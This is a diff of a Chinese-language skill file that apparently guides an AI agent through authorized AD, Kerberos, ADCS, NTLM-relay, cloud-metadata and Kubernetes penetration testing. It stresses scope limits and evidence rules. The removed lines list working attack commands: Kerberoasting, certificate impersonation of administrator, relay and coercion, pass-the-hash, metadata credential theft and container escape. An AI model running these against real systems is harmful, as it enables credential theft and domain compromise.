@@ -1,220 +1,215 @@
 ---
 name: ad-cloud
-description: 【内网/AD/云原生】用于授权范围内的内网渗透、Active Directory 攻击链与云原生环境评估。覆盖域内枚举与 BloodHound 图谱、Kerberoasting / AS-REP、ADCS ESC1-8、NTLM relay、委派滥用、PtH/WMI/WinRM/SMB 横向，以及 AK-SK 泄露、元数据 SSRF、K8s RBAC 与容器逃逸、CI/CD 凭据。判据是拿到可复现的凭据或权限提升证据，不做 Web 漏洞（走 R20）。
+description: 【内网/AD/云原生】用于授权范围内的内网渗透、Active Directory 攻击链与云原生环境评估。覆盖域内枚举与 BloodHound、Kerberoasting / AS-REP、ADCS ESC1-8、NTLM relay、委派/RBCD、PtH/WMI/WinRM/SMB 横向，以及 AK-SK 泄露、元数据 SSRF、K8s RBAC 与容器逃逸、CI/CD 凭据、Windows 认证遥测。判据是拿到可复现的凭据或权限提升证据，不做 Web 漏洞（走 R20）。
 ---
 
 # 内网 / AD / 云原生作业规范
 
-本 skill 只处理**已授权**的内网与云环境评估。所有动作以"拿到可复现的凭据或权限提升证据"为目标，不做破坏性操作，不横向扩散到授权边界之外。命令与判据细节见 `references/ad-attacks.md`、`references/cloud-native.md`、`references/kerberos-and-adcs.md`、`references/k8s-and-container.md`。
+本 skill 只处理**已授权**的内网与云环境评估。目标不是“讲全攻击”，而是每条路径都能回答：
+**判据是什么、失败长什么样、证据怎么留**。命令细节见 `references/`，判定复算见
+`scripts/ad-repro.py` 与 `scripts/cloud-iam-eval.py`。
 
-## 适用范围
+## 1. 适用 / 不适用
 
-- 已拿到一个内网 foothold（shell / 跳板机 / 低权账号），要判断能走多远
-- 域内枚举、BloodHound 采集与分析、找域管路径
-- Kerberoasting、AS-REP Roasting、委派滥用、ADCS 证书攻击
-- NTLM relay / 强制认证 / PtH / WMI / WinRM / SMB 横向
-- 云上 AK-SK 泄露、实例元数据 SSRF、K8s RBAC 提权、容器逃逸、CI/CD 凭据链
-- 需要给出"当前权限 → 目标权限"的可复现路径与证据
+### 适用
 
-不适用：纯 Web 漏洞（SQLi/XSS/SSRF 打应用层、反序列化、文件上传）→ 走 **R20**；纯二进制逆向 → 走 `ida-reverse` / `radare2`；钓鱼与免杀投递不在本 skill 默认范围。
+- 已有内网 foothold（shell / 跳板机 / 低权域账号），要判断能走多远。
+- 域内枚举、BloodHound、Kerberoast/AS-REP、ACL 滥用、委派/RBCD、ADCS、relay、横向。
+- 已有 kubeconfig/SA token/容器执行权限，要判断 RBAC、Secret、逃逸面。
+- 已有 AK/SK、CI 变量、元数据响应，要判断云身份与权限面。
+- 已有 Windows Security 日志/证书存储/注册表，要做 AD 遥测与主机基线复核。
+- 需要输出“当前权限 → 目标权限”的可复现路径、证据与失败判据。
 
-## 前置
+### 不适用
 
-### 1. 域信息（先钉住基本盘）
+- 纯 Web/API 漏洞（SQLi/XSS/SSRF 打应用层、反序列化、文件上传、越权接口）→ **R20 / web-pentest**。
+- 纯二进制逆向/脱壳 → `ida-reverse`、`unpack-loop`；固件/IoT → `firmware-iot`。
+- 供应链投毒、钓鱼、免杀投递 → 不在本 skill 默认范围；供应链走 `supply-chain-security`。
+- 未授权目标、生产拒绝服务、删改日志、默认持久化。
 
-至少确认：域名 / NetBIOS 名、DC 主机名与 IP、DNS、当前账号与权限、已控主机列表、时间同步状态。
+## 2. 前置检查（3 件）
 
-```bash
-nxc smb <DC_IP> -u <user> -p <pass> -d <domain>          # netexec，原 crackmapexec
-ldapsearch -x -H ldap://<DC_IP> -D '<user>@<domain>' -w '<pass>' -b 'dc=<domain>,dc=com'
-whoami /all & echo %USERDNSDOMAIN% & nltest /dsgetdc:<domain>   # Windows 侧
-```
-
-没有域信息时先做只读探测：`nxc smb <网段> -u '' -p ''`、DNS SRV 查询、`nmap -p88,389,445,5985`。**不要**在信息不足时直接开扫全端口或跑重型利用。
-
-### 2. 凭据来源
-
-| 来源 | 典型位置 | 备注 |
-|---|---|---|
-| 明文口令 | 配置/脚本/聊天记录/环境变量 | 优先验证，注意锁定策略 |
-| NTLM hash | SAM/LSASS/NTDS.dit、内存抓取 | PtH 用，不落盘明文 |
-| Kerberos 票据 | `.kirbi` / `.ccache` | 注意有效期与时钟 |
-| 证书 / PFX | ADCS、用户目录、CI 变量 | 可做 PKINIT / Schannel |
-| 云 AK-SK | `.aws/credentials`、环境变量、CI/CD | 先 `sts get-caller-identity` |
-| Token | 元数据服务、K8s SA、CI runner | 有 TTL，先记录过期时间 |
-
-**最小验证原则**：每个凭据先做一次低噪音校验（`nxc smb` / `ldapwhoami` / `aws sts get-caller-identity`），确认有效再进入利用链，避免用错凭据触发锁定。
-
-### 3. 可触碰边界
-
-- 授权资产清单（网段、域名、云账号、集群名），清单外一律不碰
-- 允许的动作等级：只读枚举 / 凭据验证 / 提权 / 横向 / 持久化，逐级需要明确授权
-- 禁做：批量口令喷洒、生产业务中断、删改数据、未授权的持久化与后门、对 EDR/杀软做对抗性卸载
-- 速率与时间窗：域内认证失败次数控制在锁定阈值内（默认 ≤3 次/账号），避开业务高峰
-- 证据留存：命令、时间、源/目标、返回码、关键输出，统一落到 `evidence/` 并打时间戳
-
-## 一、AD 攻击链
-
-### 1. 枚举与 BloodHound
+1. **授权边界**：资产清单（网段/域名/云账号/集群/主机）、允许的动作等级、时间窗、禁做项。
+   清单外不扫、不碰；持久化/写域对象/IAM 必须单独授权并登记回滚。
+2. **基本盘**：域名/NetBIOS、DC/CA、DNS、当前账号与权限、已控主机、时间同步；
+   K8s 的 context/cluster/user/token 有效期；云的身份/账号/订阅。
+3. **凭据与预算**：凭据来源、锁定阈值（`--pass-pol`）、认证失败预算（同账号 ≤2 次即停）、
+   证据目录与脱敏规则（口令/hash/票据/私钥/AK-SK/token 只留指纹）。
 
 ```bash
-bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <DC_IP> -c All --zip   # Linux，需域凭据
-# Windows 侧可用 SharpHound.exe -c All --zipfilename bh.zip
-```
-
-关注：到 Domain Admins 的最短路径、Unconstrained/Constrained Delegation、ACL 滥用（GenericAll/WriteDACL/ForceChangePassword）、ADCS 模板、会话与本地管理员复用。**先出图再动手**，避免盲打。
-
-### 2. Kerberoasting / AS-REP
-
-```bash
-impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerb.hash
-impacket-GetNPUsers <domain>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep.hash
-hashcat -m 13100 kerb.hash wordlist.txt    # Kerberoast；AS-REP 用 -m 18200 asrep.hash
-```
-
-判据：拿到可被离线破解的 hash，且破解出明文或可被 PtH/PKINIT 复用。只拿到 hash 未破解，算"素材"不算"证据"。
-
-### 3. ADCS（ESC1-8）
-
-```bash
-certipy find -u <user>@<domain> -p '<pass>' -dc-ip <DC_IP> -vulnerable -stdout
-certipy req -u <user>@<domain> -p '<pass>' -ca <CA> -template <Tpl> -upn administrator@<domain> -dc-ip <DC_IP>
-certipy auth -pfx administrator.pfx -dc-ip <DC_IP>   # 拿到 TGT/ccache 才算成功
-```
-
-ESC1（模板允许任意 SAN + 低权注册）、ESC2（Any Purpose）、ESC3（注册代理）、ESC4（模板 ACL 可写）、ESC5（PKI 对象 ACL）、ESC6（编辑 flag）、ESC7（CA 权限）、ESC8（HTTP 端点 NTLM relay）。详细区分与利用见 reference。
-
-### 4. NTLM relay 与强制认证
-
-```bash
-# 关闭 SMB 签名的主机上做 relay
-impacket-ntlmrelayx -tf targets.txt -smb2support -socks
-# 触发强制认证（需授权）
-responder -I eth0 -wv          # 仅监听，不做 poisoning 时先确认授权
-petitpotam.py <listener_ip> <target_ip>
-```
-
-先确认目标未开 SMB signing / LDAP signing / EPA，否则 relay 必然失败。优先打 ADCS HTTP 端点（ESC8）。
-
-### 5. 委派
-
-- Unconstrained：拿到主机本地管理员即可窃取 TGT（`Rubeus monitor` / `sekurlsa`）
-- Constrained：`impacket-getST -spn <spn> -impersonate administrator`
-- RBCD：写目标 `msDS-AllowedToActOnBehalfOfOtherIdentity`，再 S4U2Self/S4U2Proxy
-
-### 6. 横向（PtH / WMI / WinRM / SMB）
-
-```bash
-nxc smb <target> -u <user> -H <ntlm> -d <domain> --shares
-nxc wmi <target> -u <user> -H <ntlm> -d <domain> -x 'whoami'
-nxc winrm <target> -u <user> -H <ntlm> -d <domain> -x 'whoami'
-impacket-psexec|wmiexec <domain>/<user>@<target> -hashes :<ntlm>   # 最吵，最后用
-```
-
-优先级：WinRM（5985/5986）> WMI > SMB > psexec（最吵，最后用）。每次成功后立即记录主机、账号、权限级别与时间。
-
-## 二、云原生
-
-### 1. AK-SK 泄露利用
-
-```bash
+# 只读基本盘示例（按环境替换占位符）
+nxc smb <DC_IP> --pass-pol -u '' -p ''
+nxc smb <DC_IP> -u <user> -p '<pass>' -d <domain>
+python Tool/scripts/adcloud-check.py --kubeconfig ~/.kube/config --json
 aws sts get-caller-identity
-aws iam list-attached-user-policies --user-name <user>; aws iam list-user-policies --user-name <user>
-aws s3 ls; aws ec2 describe-instances --max-items 5   # 只读快查可访问资源
 ```
 
-先判定身份与权限面，再决定是提权、横向到其他账号，还是拿数据证据。**不要**直接批量导出对象存储。
+## 3. 判据表（本域 6 类）
 
-### 2. 元数据 SSRF
+> 完整表（含输入面/证据形态/误报风险）见 `references/01-criteria.md`。
+> 结论词：`confirmed`（可复现证据）/ `candidate`（条件成立但缺最后一步）/ `blocked`（不成立或预算耗尽）。
+
+| 类别 | 确认（confirmed） | 疑似（candidate） |
+| :-- | :-- | :-- |
+| Kerberos roast | TGS/AS-REP hash 破解出明文，或票据可直接复用；账号非机器号/krbtgt；有命令与指纹 | 有 TGS/AS-REP 但未破解；etype/账号状态未核对 |
+| ADCS | `certipy req` 得 pfx + `certipy auth` 出 TGT/ccache；ESC 条件逐条成立 | `find` 报 vulnerable/有 pfx，但无 Enroll、需审批、auth 未成功 |
+| 委派/RBCD | `getST` 返回服务票据且能访问目标；RBCD 写入成功并回读；有清理 | 只有 `TRUSTED_FOR_DELEGATION`/`AllowedToDelegateTo` 属性；无控主机/无票据 |
+| K8s RBAC/逃逸 | `auth can-i` yes + 实际只读动作成功；宿主 `id`/宿主文件读取；Secret 实际可用 | 有 create pods/get secrets 但被 PSA/Quota 拒绝，或 Secret 未验证 |
+| 云凭据/IAM | `sts get-caller-identity` 成功；策略文本 + boundary/SCP 不拦 + 实际 API 成功；元数据取到临时凭据并验证 | 本地有 AK/SK 明文；策略文本 allow；元数据端点可达但未取到凭据 |
+| 遥测/主机基线 | 事件 ID + LogonType + 账号/来源 + 时间线一致；证书 EKU/私钥/票据计数可复现 | 单条 4672/4624；单机无 4768/4769；有证书但未 PKINIT |
+
+### 3.1 每条结论的最小证据包
+
+| 结论类型 | 必须四件 |
+| :-- | :-- |
+| 凭据 | 来源路径/命令、获取时间、指纹（不落明文）、一次低噪音验证返回 |
+| 票据/证书 | 类型/用途、有效期、指纹、`auth`/`getST` 成功返回、目标资源访问 |
+| 权限提升 | 前后 `whoami /all`、`auth can-i`、`sts get-caller-identity` 或组成员对比 |
+| 逃逸 | Pod/容器配置、宿主命名空间命令、宿主文件或 `id` 输出、清理记录 |
+| 遥测 | EventID 计数、时间窗、来源主机、脱敏声明、EventRecordID 连续性 |
+
+## 4. 失败判据（看到即降级）
+
+完整表（现象 / 判定 / 改走哪条 / 代价）见 `references/02-failure-criteria.md`。高频项：
+
+- 认证侧：`KRB_AP_ERR_SKEW` 对时后仍失败、`STATUS_ACCOUNT_LOCKED_OUT`、同账号 4625 ≥2
+  → 停，换账号/来源；不要撞锁定阈值。
+- Roast：只拿到 TGS/AS-REP hash 未破解、AES 账号用 RC4 字典、目标机器号/krbtgt
+  → 素材，不是打穿；转委派/ADCS 或如实记录。
+- ADCS：`find` 报 vulnerable 但无 `Enroll`、模板需 manager approval、CA 拒绝 SAN、
+  pfx 未 `certipy auth` 成功 → 不成立；转 ESC4/5/7 或非 relay 面。
+- Relay：SMB/LDAP signing 强制、EPA 已开、目标只收 Kerberos → 放弃 relay。
+- 委派：SPN 不在 `AllowedToDelegateTo`、目标禁用协议转换、无控主机、RBCD 无写权限
+  → 当前分支 blocked，换目标或转 ACL/凭据。
+- K8s：`auth can-i` 全 no、`create pods` 被 PSA/Quota 拒、缺 `CAP_SYS_ADMIN`/只读挂载
+  → 停手，转 Secret/CI 凭据。
+- 云：`sts` 报 AccessDenied/ExpiredToken、元数据 403/无 IMDSv2 token、策略只有 `List*`
+  → 记录权限面，换来源。
+- 遥测：单机无 4768/4769（非域或审计未开）、EventRecordID 断档、只有 4672 类型 5
+  → 不能写域内提权；先查域成员/审计/缺口。
+- 同一手法同参数连续失败两次 → 换路线，不堆时间。
+
+## 5. 模型常见失误（≥8 条）
+
+完整 14 条（错误动作 → 为什么错 → 正确动作）见 `references/03-model-pitfalls.md`。高频：
+
+1. 把 `cluster-admin`/`system:masters` 名称写成“已提权” → 必须 `auth can-i` + 绑定核对。
+2. 把 Kerberoast TGS 写成“已拿服务账号口令” → 未破解/不可复用只是素材。
+3. 把 `certipy find` vulnerable 写成“ESC1 可利用” → 要 Enroll + 无审批 + `auth` 成功。
+4. 把“有 create pods”写成“已逃逸” → 要宿主 `id`/宿主文件证据。
+5. 把“无凭据 user”写成“匿名可访问 API server” → 在线只读确认 `system:anonymous`。
+6. 把 AK 前缀/policy 名称写成“管理员” → `sts` 身份 + 策略内容 + boundary/SCP。
+7. 把 `Action:*` 直接判“可提权” → 看 Deny/boundary/SCP/条件，文本 allow 只到 candidate。
+8. 把 ADCS pfx 写成“已拿域管 TGT” → 必须 `certipy auth` 成功。
+9. 把 Unconstrained 属性写成“已能读域控” → 要可控主机 + 高权 TGT。
+10. 把 `auth can-i get secrets` 的 yes 写成“已读所有 Secret” → 要实际读取并证明可用。
+11. 把单条 4672/4624 写成“提权/横向成功” → 看 LogonType/账号/来源/时间线。
+12. 把单机无 Kerberos 事件写成“域内安全” → 先查域成员/审计/DC 日志。
+13. 在锁定预算内换工具重复试 → 预算按账号算，不是按工具算。
+14. 为“有结论”补写未执行命令/伪造输出 → 证据必须与 rc/哈希/时间对得上。
+
+## 6. 流程（分阶段，每阶段有完成判据）
+
+### 阶段 A：固定边界与身份
+
+- 动作：确认授权清单、域/集群/云身份、当前权限、时间同步、锁定策略。
+- 完成判据：能写出“我是谁、能碰谁、不能碰谁、失败预算多少”。
+- 失败：清单不明/越界 → 停，先补授权。
+
+### 阶段 B：只读枚举与出图
+
+- AD：`nxc`/`ldapsearch`/BloodHound；K8s：`kubectl auth can-i --list`/RBAC 导出；
+  云：`sts get-caller-identity`/`list-*`；主机：Security 日志/证书/LSA 只读。
+- 完成判据：至少一条候选路径，且每条边能在原始属性/API/日志上复现。
+- 失败：采集被拒/只有名称猜测 → 标 unknown，补权限或换面。
+
+### 阶段 C：选最便宜路径做最小验证
+
+- 优先级：只读 > 单账号低影响 > 需要写对象/创建资源 > 高噪音 relay/强制认证。
+- 完成判据：`confirmed` 有完整证据包；`candidate` 有明确 blocker；`blocked` 有已排除项。
+- 失败：同一路径两次失败 → 按 `02-failure-criteria.md` 换面。
+
+### 阶段 D：证据归档与清理
+
+- 动作：命令/时间/源/目标/rc/原始输出片段/指纹；写操作回滚；测试资源删除。
+- 完成判据：换机照做能复现；没有遗留账号/计划任务/票据/容器/策略变更。
+- 失败：无法回滚/证据缺口 → 在报告里标红，不藏。
+
+## 7. 参考索引（逐篇）
+
+| 文件 | 用途 |
+| :-- | :-- |
+| `references/01-criteria.md` | 判据主表：场景/输入面/可机检判据/证据形态/误报风险 |
+| `references/02-failure-criteria.md` | 失败判据表：现象/判定/改走哪条/代价 |
+| `references/03-model-pitfalls.md` | 14 条模型常见失误与纠正 |
+| `references/04-walkthrough-windows-auth-events.md` | 真实 Windows Security 日志走查（wevtutil + ad-repro） |
+| `references/05-delegation-and-rbcd.md` | 委派/RBCD 深水：属性、票据链、失败判据 |
+| `references/ad-attacks.md` | AD 枚举/ACL/relay/横向命令速查 |
+| `references/kerberos-and-adcs.md` | Kerberos/ADCS 命令与 ESC 细节 |
+| `references/k8s-and-container.md` | K8s RBAC/Secret/逃逸/CI 细节 |
+| `references/cloud-native.md` | AK-SK/元数据/IAM/云原生细节 |
+
+## 8. 脚本用法
 
 ```bash
-curl -s -H 'X-aws-ec2-metadata-token: <token>' http://169.254.169.254/latest/meta-data/iam/security-credentials/
-curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google'
+# 离线 kubeconfig / AWS 凭据分诊（只读，不联网）
+python Tool/scripts/adcloud-check.py --kubeconfig ~/.kube/config --aws-creds ~/.aws/credentials --json
+
+# 五类判定离线复算（Kerberoast/AS-REP/ADCS/委派/K8s RBAC）+ Windows 事件
+python Tool/skill/ad-cloud/scripts/ad-repro.py --input bundle.json --json
+python Tool/skill/ad-cloud/scripts/ad-repro.py --kind windows-events --input events.json
+python Tool/skill/ad-cloud/scripts/ad-repro.py --extract-evtx-xml security.xml --redact --out events.json
+
+# IAM 策略离线评估（不调用 STS/IAM）
+python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py --input policy.json \
+  --action iam:CreatePolicyVersion --resource arn:aws:iam::123456789012:policy/demo
+
+# 自检（离线，rc=0，输出含 "ok"）
+python Tool/skill/ad-cloud/scripts/adcloud-check.py --self-test
+python Tool/skill/ad-cloud/scripts/ad-repro.py --self-test
+python Tool/skill/ad-cloud/scripts/cloud-iam-eval.py --self-test
 ```
 
-先拿 IMDSv2 token（`PUT /latest/api/token`），再取角色临时凭据；GCP/Azure 对应 endpoint 不同。判据是拿到可用的临时 AK-SK-SessionToken 并成功调用 `sts get-caller-identity`。
+失败时脚本输出 `{"ok": false, "blocked_at": "...", "reason": "..."}`，rc=2；
+不抛裸栈。证据输入只放本地，不联网。
 
-### 3. K8s RBAC 与逃逸
+## 9. 任务卡入口
 
-```bash
-kubectl auth can-i --list
-kubectl get clusterrolebinding -o wide
-kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa>
-```
+`Tool/prompts/domains/ad-cloud.md`：24 张卡，覆盖 BloodHound、ACL、ESC1/ESC8、强制认证、
+DCSync 检测、持久化边界、AWS/GCP/Azure/Okta、K8s RBAC/逃逸/etcd/kube-bench。
+每张卡含触发词/前置/步骤/判据/失败判据/reference。
 
-关注：`create pods` / `create daemonsets` / `get secrets` / `impersonate` / `bind` / `escalate`。有 `create pods` 即可挂宿主路径逃逸；有 `get secrets` 即可拿 SA token 横向。
+## 10. KB board 入口
 
-### 4. 容器逃逸
+`Tool/mcp/Tool/reverselab/kb/ad-cloud/README.md`：7 篇技术页 + 三条硬判据 + 失败判据 + 邻域边界。
 
-- privileged + `CAP_SYS_ADMIN`：挂宿主 `/` 或 `nsenter`；`hostPath` 挂 `/var/run/docker.sock`、`/run/containerd/containerd.sock`：起特权容器
-- `hostPID` + `nsenter -t 1 -m -u -i -n -p`；内核漏洞 / cgroup release_agent / `CAP_SYS_PTRACE` 注入宿主进程
+| 页 | 用途 |
+| :-- | :-- |
+| `techniques/01-kerberos-and-adcs.md` | Kerberos/ADCS 条件与命令 |
+| `techniques/02-k8s-and-container.md` | K8s/容器基础 |
+| `techniques/03-k8s-rbac-escape.md` | RBAC → 逃逸/凭据 |
+| `techniques/04-kerberos-paths.md` | Kerberos 路径速判 |
+| `techniques/05-adcs-esc-decision.md` | ESC1–ESC8 成立条件 |
+| `techniques/06-cloud-credentials-metadata.md` | 云凭据/元数据/IAM |
+| `techniques/07-failure-criteria.md` | 失败判据表 |
 
-判据：在宿主命名空间执行 `id` 或读到宿主文件系统，且能给出复现命令。
+## 11. 边界
 
-### 5. CI/CD 凭据
+- 不做 Web 漏洞：SQLi/XSS/SSRF 打应用层、反序列化、文件上传、越权接口 → R20。
+- 不做未授权钓鱼、免杀、供应链投毒、生产拒绝服务；不删除/篡改日志。
+- 不绕过客户明确声明的 EDR/审计要求；不把真实用户数据带出授权范围。
+- 不默认持久化；持久化必须单独授权并登记清理方式。
+- 云上不碰授权账号外资源，不创建计费资源，不修改 IAM/集群策略（除非授权且已备份）。
+- 真实口令、hash、票据、证书私钥、AK/SK、token 一律不落盘/不回传；只留指纹与声明。
+- 离线结论必须标 `offline`/`unknown`；在线只做只读或明确授权的低影响验证。
+- 风险与修复建议分开写；不把“能打穿”直接等同于“必须立刻修”。
 
-检查：流水线环境变量、runner 上的 `~/.aws`、`~/.docker/config.json`、`GITHUB_TOKEN` / `CI_JOB_TOKEN`、制品仓库凭据、签名密钥。重点判断 token 的 scope 与是否可跨仓库/跨环境提权。
+## 12. 验收清单
 
-## 判据（什么算"打穿"）
-
-同时满足三条才算有效结论，缺一条只能写"待验证"：
-
-1. **凭据可复现**：给出完整的获取命令/路径与返回，换一台干净机器照做仍能得到同一凭据或同一权限。
-2. **权限提升可见证**：`whoami /all`、`kubectl auth can-i`、`aws sts get-caller-identity`、域管组成员等**客观输出**证明权限级别发生变化。
-3. **证据可归档**：命令、时间戳、源/目标、原始输出、hash/证书/票据的指纹（不回传明文敏感数据），能支撑报告复现。
-
-## 失败判据（必须降级为「未验证」）
-
-出现以下任一情况，这条路已走不通：结论只能写「未验证」，并转到括注的替代路线：
-
-- 认证侧根本进不去：`KRB_AP_ERR_SKEW` 对时后仍失败、`STATUS_ACCOUNT_LOCKED_OUT`、或同一账号连续 2 次 4625 → 停，换账号/换来源，别再撞锁定阈值。
-- 只有 hash/票据/证书、没有明文或可用会话（Kerberoast 仅 AES 且字典不中、ADCS 只拿到 pfx 未 `certipy auth` 成功）→ 是「素材」不是「打穿」，转 ADCS/委派或如实记录。
-- `certipy find` 报 vulnerable 但当前账号无 `Enroll`、模板需 manager approval、CA 拒绝 SAN → 别在 ESC1/ESC6 上反复试，转 ESC4/ESC5/ESC7（需 ACL 或 CA 权限）。
-- relay 侧全堵：SMB/LDAP signing 强制、EPA 已开、目标只收 Kerberos → 放弃 relay，转凭据直连或 ADCS HTTP 之外的面。
-- 委派不可用：`msDS-AllowedToDelegateTo` 不含目标、SPN 不匹配、目标禁用协议转换、无 RBCD 写权限 → 转 ACL 滥用（`ad-attacks.md`）或横向凭据复用。
-- 云侧身份无效：`aws sts get-caller-identity` 报 AccessDenied/ExpiredToken，元数据端点 403/超时，或凭据只有 `List*` 无可利用写权限 → 记录权限面后转其他凭据来源。
-- 集群侧权限不足：`kubectl auth can-i` 均为 no、`create pods` 被 PSA/Quota 拦、逃逸缺 `CAP_SYS_ADMIN` 或挂载只读 → 停手，转 Secret/CI 凭据面，不再反复提权。
-- 连续两次同一手法失败（同工具同参数、同目标同入口）→ 换路线或汇报，不堆时间。
-
-## 工具与降级
-
-| 工具 | 用途 | 缺失时 |
-|---|---|---|
-| `impacket-*` | GetUserSPNs / GetNPUsers / getST / psexec / wmiexec / ntlmrelayx | `pipx install impacket`；或改走 `nxc` 对应模块 |
-| `certipy` | ADCS 枚举与利用 | `pipx install certipy-ad`；或 `certipy find` 的手工 LDAP 替代 |
-| `bloodhound-python` / SharpHound | AD 图谱采集 | 无采集器时用 `ldapsearch` + `nxc` 手工拼关键关系 |
-| `Rubeus` | 票据申请/导入/委派 | Linux 侧用 `impacket-getST` / `getTGT` 替代 |
-| `nxc`（netexec） | SMB/LDAP/WMI/WinRM 一把梭 | 退回 `smbclient` / `wmiexec` / `evil-winrm` |
-| `kubectl` | K8s 枚举与利用 | 直接用 API Server + SA token `curl` |
-| `awscli` | 云身份与资源枚举 | `curl` 调 STS/IAM API（SigV4 手签） |
-| `trivy` | 镜像/配置漏洞与密钥扫描 | `grype` / `syft`；或手工查 Dockerfile 与镜像层 |
-
-环境里没有对应工具时**不要现场编造命令**：先 `pipx`/包管理器安装并在报告注明版本；仍不可用时走 `powershell -File Tool/scripts/tool-run.ps1 -Tool <tool-id>`（`-ListModes` 查通道），最后降级为只读手工枚举 + 证据记录。
-
-## 坑
-
-1. **账号锁定**：域默认锁定阈值常见 5 次，实际按 3 次控制。喷洒前先 `nxc smb --pass-pol` 读策略；同一账号失败 2 次即停，换账号或换来源。
-2. **触发告警**：Kerberoasting 的 RC4 TGS 请求、大量 4625、`ntlmrelayx` 的 SMB 连接、`psexec` 的服务创建（7045）都是高保真告警。控制速率、错峰、优先用已有凭据而非爆破。
-3. **时钟偏移**：Kerberos 默认容忍 5 分钟。容器/跳板机时间漂移会导致 `KRB_AP_ERR_SKEW`，先 `chronyc tracking` / `w32tm /stripchart` 对齐再申请票据。
-4. **云审计日志**：CloudTrail / GuardDuty / Azure Activity Log / K8s audit 会记录 `GetSecretValue`、`AssumeRole`、`create pods`、`exec`。优先用只读 API、避免批量列举；所有调用记录时间以便与告警对齐。
-5. **票据/令牌过期**：TGT 默认 10 小时、云临时凭据通常 1 小时、SA token 可能绑定 Pod 生命周期。拿到就记录到期时间，别在报告里把过期凭据当有效证据。
-6. **NTLM relay / ADCS 误判**：relay 失败多半是 SMB/LDAP signing 或 EPA 已开、强制 SMBv3 加密；`certipy find` 报 vulnerable 不等于可利用，要确认当前账号对模板有 Enroll、CA 允许 SAN、无 manager approval。先验证再投入。
-7. **容器逃逸后误伤**：挂宿主根目录只读优先；`nsenter` 前确认 PID 命名空间；不要在宿主上装工具或改配置。
-
-## 验收
-
-- [ ] 授权边界文档在案，所有动作未越界
-- [ ] 每条结论都有"命令 + 输出 + 时间 + 源/目标"
-- [ ] 凭据类证据给出获取路径与可复现步骤，敏感值做脱敏/指纹化
-- [ ] 提权类证据给出前后对比（权限、组成员、`auth can-i` 结果）
-- [ ] 明确标注失败路径与失败原因（如 signing 已开、模板需审批）；未在目标遗留持久化/计划任务/后门账号（除非单独授权）
-- [ ] 风险与修复建议分开写，不把"能打穿"直接等同于"必须立刻修"；`json`/脚本类产物做过语法校验，路径与仓库约定一致
-
-## 边界
-
-- **不做 Web 漏洞**：SQLi、XSS、SSRF 打应用层、反序列化、文件上传、越权接口等一律走 **R20**。本 skill 只在"已拿到 foothold 或云凭据"之后接手。
-- 不做未授权的钓鱼、免杀、供应链投毒、对生产业务的拒绝服务。
-- 不绕过客户明确声明的 EDR/审计要求；不删除或篡改日志。
-- 不把内网/云环境中的真实用户数据带出授权范围；证据中的口令、hash、AK-SK 一律脱敏。
-- 不默认做持久化；持久化必须单独授权并登记清理方式。
-- 云上不碰授权账号之外的资源，不创建计费资源，不修改 IAM 策略（除非授权且已备份）。
+- [ ] 授权边界文档在案，所有动作未越界。
+- [ ] 每条结论都有命令 + 输出 + 时间 + 源/目标 + rc。
+- [ ] 凭据/票据/证书有获取路径与指纹，敏感值脱敏。
+- [ ] 提权有前后对比；逃逸有宿主证据与清理。
+- [ ] 失败路径写明 blocker、已排除项、下一步与代价。
+- [ ] 未在目标遗留持久化/计划任务/后门账号（除非单独授权并登记）。
+- [ ] JSON/脚本产物做过语法校验；案例 `sha256` 与磁盘一致。
